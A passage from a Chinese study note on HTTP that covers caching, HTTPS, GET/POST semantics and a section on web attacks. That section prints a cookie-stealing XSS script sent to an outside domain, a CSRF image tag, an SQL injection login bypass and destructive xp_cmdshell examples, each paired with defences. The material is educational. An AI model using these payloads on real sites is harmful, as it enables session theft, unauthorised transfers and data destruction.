字段中，表示缓存服务器需要先向原服务器验证缓存资源是否过期</li><li>该指令出现在响应报文的 <code>Cache-Control</code> 字段中，表示缓存服务器在进行缓存之前需要先验证缓存资源的有效性</li></ul><h3 id="5-2-5-no-store-指令"><a href="#5-2-5-no-store-指令" class="headerlink" title="5.2.5 no-store 指令"></a>5.2.5 no-store 指令</h3><ul><li>该指令表示缓存服务器不能对请求或响应的任何一部分进行缓存。</li><li><code>no-cache</code> 不表示不缓存，而是缓存之前需要先进行验证，<code>no-store</code> 才是不进行缓存。</li></ul><h3 id="5-2-6-max-age-指令"><a href="#5-2-6-max-age-指令" class="headerlink" title="5.2.6 max-age 指令"></a>5.2.6 max-age 指令</h3><ul><li>该指令出现在请求报文的 <code>Cache-Control</code> 字段中，如果缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。</li><li>该指令出现在响应报文的 <code>Cache-Control</code> 字段中，表示缓存资源在缓存服务器中保存的时间。</li><li><code>Expires</code> 字段也可以用于告知缓存服务器该资源什么时候会过期。在 <code>HTTP/1.1</code>中，会优先处理 <code>Cache-Control : max-age</code> 指令；而在 <code>HTTP/1.0</code> 中，<code>Cache-Control : max-age</code> 指令会被忽略掉。</li></ul><h2 id="5-3-持久连接"><a href="#5-3-持久连接" class="headerlink" title="5.3 持久连接"></a>5.3 持久连接</h2><blockquote><p>当浏览器访问一个包含多张图片的 <code>HTML</code> 页面时，除了请求访问 <code>HTML</code> 页面资源，还会请求图片资源，如果每进行一次 <code>HTTP</code> 通信就要断开一次 <code>TCP</code> 连接，连接建立和断开的开销会很大。持久连接只需要建立一次 <code>TCP</code> 连接就能进行多次 HTTP 通信。</p></blockquote><p><img src="http://7xq6al.com1.z0.glb.clouddn.com/http-5.png" alt=""></p><ul><li>持久连接需要使用 <code>Connection</code> 首部字段进行管理。<code>HTTP/1.1</code> 开始 <code>HTTP</code> 默认是持久化连接的，如果要断开 <code>TCP</code> 连接，需要由客户端或者服务器端提出断开，使用 <code>Connection : close</code>；而在 <code>HTTP/1.1</code> 之前默认是非持久化连接的，如果要维持持续连接，需要使用 <code>Connection : Keep-Alive</code>。</li></ul><h2 id="5-4-管线化处理"><a href="#5-4-管线化处理" class="headerlink" title="5.4 管线化处理"></a>5.4 管线化处理</h2><blockquote><p><code>HTTP/1.1</code> 支持管线化处理，可以同时发送多个请求和响应，而不需要发送一个请求然后等待响应之后再发下一个请求。</p></blockquote><h2 id="5-5-编码"><a href="#5-5-编码" class="headerlink" title="5.5 编码"></a>5.5 编码</h2><ul><li>编码（Encoding）主要是为了对实体进行压缩。常用的编码有：<code>gzip</code>、<code>compress</code>、<code>deflate</code>、<code>identity</code>，其中 <code>identity</code> 表示不执行压缩的编码格式。</li></ul><h2 id="5-6-分块传输编码"><a href="#5-6-分块传输编码" class="headerlink" title="5.6 分块传输编码"></a>5.6 分块传输编码</h2><ul><li><code>Chunked Transfer Coding</code>，可以把数据分割成多块，让浏览器逐步显示页面。</li></ul><h2 id="5-7-多部分对象集合"><a href="#5-7-多部分对象集合" class="headerlink" title="5.7 多部分对象集合"></a>5.7 多部分对象集合</h2><ul><li>一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。</li></ul><p>例如，上传多个表单时可以使用如下方式：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=AaB03x</span><br><span class="line"></span><br><span class="line">--AaB03x</span><br><span class="line">Content-Disposition: form-data; name="submit-name"</span><br><span class="line"></span><br><span class="line">Larry</span><br><span class="line">--AaB03x</span><br><span class="line">Content-Disposition: form-data; name="files"; filename="file1.txt"</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">... contents of file1.txt ...</span><br><span class="line">--AaB03x--</span><br></pre></td></tr></table></figure><h2 id="5-8-范围请求"><a href="#5-8-范围请求" class="headerlink" title="5.8 范围请求"></a>5.8 范围请求</h2><ul><li>如果网络出现中断，服务器只发送了一部分数据，范围请求使得客户端能够只请求未发送的那部分数据，从而避免服务器端重新发送所有数据。</li><li>在请求报文首部中添加 Range 字段指定请求的范围，请求成功的话服务器发送 <code>206 Partial Content</code> 状态。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /z4d4kWk.jpg HTTP/1.1</span><br><span class="line">Host: i.imgur.com</span><br><span class="line">Range: bytes=0-1023</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 206 Partial Content</span><br><span class="line">Content-Range: bytes 0-1023/146515</span><br><span class="line">Content-Length: 1024</span><br><span class="line">...</span><br><span class="line">(binary content)</span><br></pre></td></tr></table></figure><h2 id="5-9-内容协商"><a href="#5-9-内容协商" class="headerlink" title="5.9 内容协商"></a>5.9 内容协商</h2><ul><li>通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。</li><li>涉及以下首部字段：<code>Accept</code>、<code>Accept-Charset</code>、<code>Accept-Encoding</code>、<code>Accept-Language</code>、<code>Content-Language</code>。</li></ul><h2 id="5-10-虚拟主机"><a href="#5-10-虚拟主机" class="headerlink" title="5.10 虚拟主机"></a>5.10 虚拟主机</h2><ul><li><code>HTTP/1.1</code> 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。</li><li>使用 <code>Host</code> 首部字段进行处理。</li></ul><h2 id="5-11-通信数据转发"><a href="#5-11-通信数据转发" class="headerlink" title="5.11 通信数据转发"></a>5.11 通信数据转发</h2><h3 id="5-11-1-代理"><a href="#5-11-1-代理" class="headerlink" title="5.11.1 代理"></a>5.11.1 代理</h3><ul><li>代理服务器接受客户端的请求，并且转发给其它服务器。</li><li>使用代理的主要目的是：缓存、网络访问控制以及访问日志记录。</li><li>代理服务器分为正向代理和反向代理两种，用户察觉得到正向代理的存在，而反向代理一般位于内部网络中，用户察觉不到。</li></ul><p><img src="http://7xq6al.com1.z0.glb.clouddn.com/http-6.png" alt=""></p><h3 id="2-网关"><a href="#2-网关" class="headerlink" title="2. 网关"></a>2. 网关</h3><ul><li>与代理服务器不同的是，网关服务器会将 <code>HTTP</code> - 转化为其它协议进行通信，从而请求其它非 <code>HTTP</code>服务器的服务。</li></ul><h3 id="3-隧道"><a href="#3-隧道" class="headerlink" title="3. 隧道"></a>3. 隧道</h3><ul><li>使用 SSL 等加密手段，为客户端和服务器之间建立一条安全的通信线路。隧道本身不去解析 HTTP 请求。</li></ul><h1 id="六、HTTPs"><a href="#六、HTTPs" class="headerlink" title="六、HTTPs"></a>六、HTTPs</h1><blockquote><p>HTTP 有以下安全性问题：</p></blockquote><ul><li>使用明文进行通信，内容可能会被窃听；</li><li>不验证通信方的身份，通信方的身份有可能遭遇伪装；</li><li>无法证明报文的完整性，报文有可能遭篡改。</li></ul><blockquote><p>HTTPs 并不是新协议，而是 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信。也就是说 HTTPs 使用了隧道进行通信。</p></blockquote><ul><li>通过使用 <code>SSL</code>，<code>HTTPs</code> 具有了加密、认证和完整性保护。</li></ul><p><img src="http://7xq6al.com1.z0.glb.clouddn.com/http-7.jpg" alt=""></p><h2 id="6-1-加密"><a href="#6-1-加密" class="headerlink" title="6.1 加密"></a>6.1 加密</h2><h3 id="6-1-1-对称密钥加密"><a href="#6-1-1-对称密钥加密" class="headerlink" title="6.1.1 对称密钥加密"></a>6.1.1 对称密钥加密</h3><blockquote><p>对称密钥加密（<code>Symmetric-Key Encryption</code>），加密的加密和解密使用同一密钥。</p></blockquote><ul><li>优点：运算速度快；</li><li>缺点：密钥容易被获取。</li></ul><p><img src="http://7xq6al.com1.z0.glb.clouddn.com/http-8.png" alt=""></p><h3 id="6-1-2-公开密钥加密"><a href="#6-1-2-公开密钥加密" class="headerlink" title="6.1.2 公开密钥加密"></a>6.1.2 公开密钥加密</h3><blockquote><p>公开密钥加密（<code>Public-Key Encryption</code>），也称为非对称密钥加密，使用一对密钥用于加密和解密，分别为公开密钥和私有密钥。公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。</p></blockquote><ul><li>优点：更为安全；</li><li>缺点：运算速度慢；</li></ul><p><img src="http://7xq6al.com1.z0.glb.clouddn.com/http-9.png" alt=""></p><h3 id="6-1-3-HTTPs-采用的加密方式"><a href="#6-1-3-HTTPs-采用的加密方式" class="headerlink" title="6.1.3 HTTPs 采用的加密方式"></a>6.1.3 HTTPs 采用的加密方式</h3><blockquote><p><code>HTTPs</code> 采用混合的加密机制，使用公开密钥加密用于传输对称密钥，之后使用对称密钥加密进行通信。（下图中的 <code>Session Key</code>就是对称密钥）</p></blockquote><p><img src="http://7xq6al.com1.z0.glb.clouddn.com/http-10.png" alt=""></p><h2 id="6-2-认证"><a href="#6-2-认证" class="headerlink" title="6.2 认证"></a>6.2 认证</h2><ul><li>通过使用  <strong>证书</strong>  来对通信方进行认证。</li></ul><blockquote><p>数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。</p></blockquote><ul><li>进行<code>HTTPs</code> 通信时，服务器会把证书发送给客户端，客户端取得其中的公开密钥之后，先进行验证，如果验证通过，就可以开始通信。</li><li>使用 <code>OpenSSL</code> 这套开源程序，每个人都可以构建一套属于自己的认证机构，从而自己给自己颁发服务器证书。浏览器在访问该服务器时，会显示“无法确认连接安全性”或“该网站的安全证书存在问题”等警告消息。</li></ul><h2 id="6-3-完整性"><a href="#6-3-完整性" class="headerlink" title="6.3 完整性"></a>6.3 完整性</h2><ul><li><code>SSL</code> 提供报文摘要功能来验证完整性。</li></ul><h1 id="七、Web-攻击技术"><a href="#七、Web-攻击技术" class="headerlink" title="七、Web 攻击技术"></a>七、Web 攻击技术</h1><h2 id="7-1-攻击模式"><a href="#7-1-攻击模式" class="headerlink" title="7.1 攻击模式"></a>7.1 攻击模式</h2><h3 id="7-1-1-主动攻击"><a href="#7-1-1-主动攻击" class="headerlink" title="7.1.1 主动攻击"></a>7.1.1 主动攻击</h3><blockquote><p>直接攻击服务器，具有代表性的有 <code>SQL</code> 注入和 <code>OS</code> 命令注入。</p></blockquote><h3 id="7-1-2-被动攻击"><a href="#7-1-2-被动攻击" class="headerlink" title="7.1.2 被动攻击"></a>7.1.2 被动攻击</h3><ul><li>设下圈套，让用户发送有攻击代码的 <code>HTTP</code> 请求，用户会泄露 <code>Cookie</code> 等个人信息，具有代表性的有跨站脚本攻击和跨站请求伪造。</li></ul><h2 id="7-2-跨站脚本攻击"><a href="#7-2-跨站脚本攻击" class="headerlink" title="7.2 跨站脚本攻击"></a>7.2 跨站脚本攻击</h2><h3 id="7-2-1-概念"><a href="#7-2-1-概念" class="headerlink" title="7.2.1 概念"></a>7.2.1 概念</h3><blockquote><p>跨站脚本攻击（<code>Cross-Site Scripting, XSS</code>），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和 Cookie 等各种内容。</p></blockquote><p>例如有一个论坛网站，攻击者可以在上面发表以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>之后该内容可能会被渲染成以下形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure><blockquote><p>另一个用户浏览了含有这个内容的页面将会跳往 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p></blockquote><h3 id="7-2-2-危害"><a href="#7-2-2-危害" class="headerlink" title="7.2.2 危害"></a>7.2.2 危害</h3><ul><li>伪造虚假的输入表单骗取个人信息</li><li>窃取用户的 <code>Cookie</code> 值</li><li>显示伪造的文章或者图片</li></ul><h3 id="7-2-3-防范手段"><a href="#7-2-3-防范手段" class="headerlink" title="7.2.3 防范手段"></a>7.2.3 防范手段</h3><p><strong>过滤特殊字符</strong></p><p>许多语言都提供了对 HTML 的过滤：</p><ul><li>PHP 的 <code>htmlentities()</code> 或是 <code>htmlspecialchars()</code>。</li><li>Python 的 <code>cgi.escape()</code>。</li><li>Java 的 <code>xssprotect</code> (Open Source Library)。</li><li>Node.js 的 <code>node-validator</code>。</li></ul><p><strong>指定 HTTP 的 Content-Type</strong></p><p>通过这种方式，可以避免内容被当成 HTML 解析，比如 PHP 语言可以使用以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   header(<span class="string">'Content-Type: text/javascript; charset=utf-8'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="7-3-跨站点请求伪造"><a href="#7-3-跨站点请求伪造" class="headerlink" title="7.3 跨站点请求伪造"></a>7.3 跨站点请求伪造</h2><h3 id="7-3-1-概念"><a href="#7-3-1-概念" class="headerlink" title="7.3.1 概念"></a>7.3.1 概念</h3><blockquote><p>跨站点请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p></blockquote><ul><li>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</li></ul><p>假如一家银行用以执行转账操作的 URL 地址如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。</span><br></pre></td></tr></table></figure><p>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。</span><br></pre></td></tr></table></figure><ul><li>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 资金。</li><li>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</li><li>透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</li></ul><h3 id="7-3-2-防范手段"><a href="#7-3-2-防范手段" class="headerlink" title="7.3.2 防范手段"></a>7.3.2 防范手段</h3><p><strong>检查 Referer 字段</strong></p><ul><li>HTTP 头中有一个 Referer 字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer 字段应和请求的地址位于同一域名下。</li><li>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</li></ul><p><strong>添加校验 Token</strong></p><blockquote><p>由于 CSRF 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行 CSRF 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过 CSRF 传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验 Token 的值为空或者错误，拒绝这个可疑请求。</p></blockquote><h2 id="7-4-SQL-注入攻击"><a href="#7-4-SQL-注入攻击" class="headerlink" title="7.4 SQL 注入攻击"></a>7.4 SQL 注入攻击</h2><h3 id="7-4-1-概念"><a href="#7-4-1-概念" class="headerlink" title="7.4.1 概念"></a>7.4.1 概念</h3><p>服务器上的数据库运行非法的 SQL 语句。</p><h3 id="7-4-2-攻击原理"><a href="#7-4-2-攻击原理" class="headerlink" title="7.4.2 攻击原理"></a>7.4.2 攻击原理</h3><p>例如一个网站登录验证的 SQL 查询代码为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> (<span class="keyword">name</span> = <span class="string">'" + userName + "'</span>) <span class="keyword">and</span> (pw = <span class="string">'"+ passWord +"'</span>);"</span><br></pre></td></tr></table></figure><p>如果填入以下内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">userName = "1' OR '1'='1";</span><br><span class="line">passWord = "1' OR '1'='1";</span><br></pre></td></tr></table></figure><p>那么 SQL 查询字符串为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> (<span class="keyword">name</span> = <span class="string">'1'</span> <span class="keyword">OR</span> <span class="string">'1'</span>=<span class="string">'1'</span>) <span class="keyword">and</span> (pw = <span class="string">'1'</span> <span class="keyword">OR</span> <span class="string">'1'</span>=<span class="string">'1'</span>);"</span><br></pre></td></tr></table></figure><p>此时无需验证通过就能执行以下查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span>;"</span><br></pre></td></tr></table></figure><h3 id="7-4-3-危害"><a href="#7-4-3-危害" class="headerlink" title="7.4.3 危害"></a>7.4.3 危害</h3><ul><li>数据表中的数据外泄，例如个人机密数据，账户数据，密码等。</li><li>数据结构被黑客探知，得以做进一步攻击（例如 SELECT * FROM sys.tables）。</li><li>数据库服务器被攻击，系统管理员账户被窜改（例如 ALTER LOGIN sa WITH PASSWORD=’xxxxxx’）。</li><li>获取系统较高权限后，有可能得以在网页加入恶意链接、恶意代码以及 XSS 等。</li><li>经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如 xp_cmdshell “net stop iisadmin” 可停止服务器的 IIS 服务）。</li><li>破坏硬盘数据，瘫痪全系统（例如 xp_cmdshell “FORMAT C:”）。</li></ul><h3 id="7-4-4-防范手段"><a href="#7-4-4-防范手段" class="headerlink" title="7.4.4 防范手段"></a>7.4.4 防范手段</h3><ul><li>在设计应用程序时，完全使用参数化查询（Parameterized Query）来设计数据访问功能。</li><li>在组合 SQL 字符串时，先针对所传入的参数作字符取代（将单引号字符取代为连续 2 个单引号字符）。</li><li>如果使用 PHP 开发网页程序的话，亦可打开 PHP 的魔术引号（Magic quote）功能（自动将所有的网页传入参数，将单引号字符取代为连续 2 个单引号字符）。</li><li>其他，使用其他更安全的方式连接 SQL 数据库。例如已修正过 SQL 注入问题的数据库连接组件，例如 ASP.NET 的 SqlDataSource 对象或是 LINQ to SQL。</li><li>使用 SQL 防注入系统。</li></ul><h2 id="7-5-拒绝服务攻击"><a href="#7-5-拒绝服务攻击" class="headerlink" title="7.5 拒绝服务攻击"></a>7.5 拒绝服务攻击</h2><h3 id="7-5-1-概念"><a href="#7-5-1-概念" class="headerlink" title="7.5.1 概念"></a>7.5.1 概念</h3><ul><li>拒绝服务攻击（<code>denial-of-service attack</code>，<code>DoS</code>），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</li><li>分布式拒绝服务攻击（<code>distributed denial-of-service attack</code>，<code>DDoS</code>），指攻击者使用网络上两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</li></ul><blockquote><p><a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A" target="_blank" rel="noopener">维基百科：拒绝服务攻击</a></p></blockquote><h1 id="八、GET-和-POST-的区别"><a href="#八、GET-和-POST-的区别" class="headerlink" title="八、GET 和 POST 的区别"></a>八、GET 和 POST 的区别</h1><h2 id="8-1-参数"><a href="#8-1-参数" class="headerlink" title="8.1 参数"></a>8.1 参数</h2><ul><li>GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在内容实体中。</li><li>GET 的传参方式相比于 POST 安全性较差，因为 GET 传的参数在 URL 中是可见的，可能会泄露私密信息。并且 GET 只支持 ASCII 字符，如果参数为中文则可能会出现乱码，而 POST 支持标准字符集。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /test/demo_form.asp?name1=value1&amp;name2=value2 HTTP/1.1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /test/demo_form.asp HTTP/1.1</span><br><span class="line">Host: w3schools.com</span><br><span class="line">name1=value1&amp;name2=value2</span><br></pre></td></tr></table></figure><h2 id="8-2-安全"><a href="#8-2-安全" class="headerlink" title="8.2 安全"></a>8.2 安全</h2><ul><li>安全的 HTTP 方法不会改变服务器状态，也就是说它只是可读的。</li><li>GET 方法是安全的，而 POST 却不是，因为 POST 的目的是传送实体主体内容，这个内容可能是用户上传的表单数据，上传成功之后，服务器可能把这个数据存储到数据库中，因此状态也就发生了改变。</li><li>安全的方法除了 GET 之外还有：<code>HEAD</code>、<code>OPTIONS</code>。</li><li>不安全的方法除了 POST 之外还有 <code>PUT</code>、<code>DELETE</code>。</li></ul><h2 id="8-3-幂等性"><a href="#8-3-幂等性" class="headerlink" title="8.3 幂等性"></a>8.3 幂等性</h2><ul><li>幂等的 HTTP 方法，同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。在正确实现的条件下，GET，HEAD，PUT 和 DELETE 等方法都是幂等的，而 POST 方法不是。所有的安全方法也都是幂等的。</li><li><code>GET /pageX HTTP/1.1</code> 是幂等的。连续调用多次，客户端接收到的结果都是一样的：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /pageX HTTP/1.1</span><br><span class="line">GET /pageX HTTP/1.1</span><br><span class="line">GET /pageX HTTP/1.1</span><br><span class="line">GET /pageX HTTP/1.1</span><br></pre></td></tr></table></figure><ul><li><code>POST /add_row HTTP/1.1</code> 不是幂等的。如果调用多次，就会增加多行记录：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /add_row HTTP/1.1</span><br><span class="line">POST /add_row HTTP/1.1   -&gt; Adds a 2nd row</span><br><span class="line">POST /add_row HTTP/1.1   -&gt; Adds a 3rd row</span><br></pre></td></tr></table></figure><ul><li><code>DELETE /idX/delete HTTP/1.1</code> 是幂等的，即便是不同请求之间接收到的状态码不一样：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DELETE /idX/delete HTTP/1.1   -&gt; Returns 200 if idX exists</span><br><span class="line">DELETE /idX/delete HTTP/1.1   -&gt; Returns 404 as it just got deleted</span><br><span class="line">DELETE /idX/delete HTTP/1.1   -&gt; Returns 404</span><br></pre></td></tr></table></figure><h2 id="8-4-可缓存"><a href="#8-4-可缓存" class="headerlink" title="8.4 可缓存"></a>8.4 可缓存</h2><blockquote><p>如果要对响应进行缓存，需要满足以下条件：</p></blockquote><ul><li>请求报文的 <code>HTTP</code> 方法本身是可缓存的，包括 <code>GET</code> 和 <code>HEAD</code>，但是 <code>PUT</code> 和 <code>DELETE</code> 不可缓存，<code>POST</code> 在多数情况下不可缓存的。</li><li>响应报文的状态码是可缓存的，包括：<code>200</code>, <code>203</code>, <code>204</code>, <code>206</code>, <code>300</code>,<code>301</code>, <code>404</code>, <code>405</code>, <code>410</code>, <code>414</code>, and 501。</li><li>响应报文的 <code>Cache-Control</code> 首部字段没有指定不进行缓存。</li></ul><h2 id="8-5-XMLHttpRequest"><a href="#8-5-XMLHttpRequest" class="headerlink" title="8.5 XMLHttpRequest"></a>8.5 XMLHttpRequest</h2><ul><li>为了阐述 <code>POST</code> 和 <code>GET</code> 的另一个区别，需要先了解 <code>XMLHttpRequest</code>：</li></ul><blockquote><p>XMLHttpRequest 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。</p></blockquote><ul><li>在使用 <code>XMLHttpRequest</code> 的 <code>POST</code> 方法时，浏览器会先发送 <code>Header</code> 再发送 <code>Data</code>。但并不是所有浏览器会这么做，例如火狐就不会。</li></ul><h1 id="九、各版本比较"><a href="#九、各版本比较" class="headerlink" title="九、各版本比较"></a>九、各版本比较</h1><h2 id="9-1-HTTP-1-0-与-HTTP-1-1-的区别"><a href="#9-1-HTTP-1-0-与-HTTP-1-1-的区别" class="headerlink" title="9.1 HTTP/1.0 与 HTTP/1.1 的区别"></a>9.1 HTTP/1.0 与 HTTP/1.1 的区别</h2><ul><li><code>HTTP/1.1</code> 默认是持久连接</li><li><code>HTTP/1.1</code> 支持管线化处理</li><li><code>HTTP/1.1</code> 支持虚拟主机</li><li><code>HTTP/1.1</code> 新增状态码 <code>100</code></li><li><code>HTTP/1.1</code> 只是分块传输编码</li><li><code>HTTP/1.1</code> 新增缓存处理指令 <code>max-age</code></li></ul><h2 id="9-2-HTTP-1-1-与-HTTP-2-0-的区别"><a href="#9-2-HTTP-1-1-与-HTTP-2-0-的区别" class="headerlink" title="9.2 HTTP/1.1 与 HTTP/2.0 的区别"></a>9.2 HTTP/1.1 与 HTTP/2.0 的区别</h2><h3 id="9-2-1-多路复用"><a href="#9-2-1-多路复用" class="headerlink" title="9.2.1 多路复用"></a>9.2.1 多路复用</h3><ul><li><code>HTTP/2.0</code> 使用多路复用技术，使用同一个 <code>TCP</code> 连接来处理多个请求</li></ul><h3 id="9-2-2-首部压缩"><a href="#9-2-2-首部压缩" class="headerlink" title="9.2.2 首部压缩"></a>9.2.2 首部压缩</h3><blockquote><p>HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。HTTP/2.0 要求通讯双方各自缓存一份首部字段表，从而避免了重复传输。</p></blockquote><h3 id="9-2-3-服务端推送"><a href="#9-2-3-服务端推送" class="headerlink" title="9.2.3 服务端推送"></a>9.2.3 服务端推送</h3><ul><li>在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 <code>index.html</code> 页面，服务端就把 <code>index.js</code> 一起发给客户端</li></ul><h3 id="9-2-4-二进制格式"><a href="#9-2-4-二进制格式" class="headerlink" title="9.2.4 二进制格式"></a>9.2.4 二进制格式</h3><ul><li><code>HTTP/1.1</code> 的解析是基于文本的，而 <code>HTTP/2.0</code> 采用二进制格式</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;一-、基础概念&quot;&gt;&lt;a href=&quot;#一-、基础概念&quot; class=&quot;headerlink&quot; title=&quot;一 、基础概念&quot;&gt;&lt;/a&gt;一 、基础概念&lt;/h1&gt;&lt;h2 id=&quot;1-1-Web-基础&quot;&gt;&lt;a href=&quot;#1-1-Web-基础&quot; class=&quot;head
      
    
    </summary>
    
